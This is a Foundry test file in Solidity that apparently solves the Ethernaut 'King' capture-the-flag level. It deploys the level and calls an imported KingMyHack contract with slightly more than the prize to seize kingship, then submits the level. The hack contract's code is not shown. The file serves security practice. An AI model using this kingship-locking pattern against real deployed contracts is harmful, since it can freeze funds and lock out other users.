pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/King/KingFactory.sol";
import "../src/levels/King/KingMyHack.sol";
import "../src/core//Ethernaut.sol";

contract KingTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
        King ethernautKing = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        console.log("Prize: %s", ethernautKing.prize());
        console.log("King: %s", ethernautKing._king());

        KingMyHack hack = new KingMyHack{value: 1000000000000000001}();

        hack.hack(payable(address(ethernautKing)));

        //address(ethernautKing).call{value: 1000000000000000001}("");

        console.log("EOA:  %s", address(hack));
        console.log("King: %s", ethernautKing._king());



        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}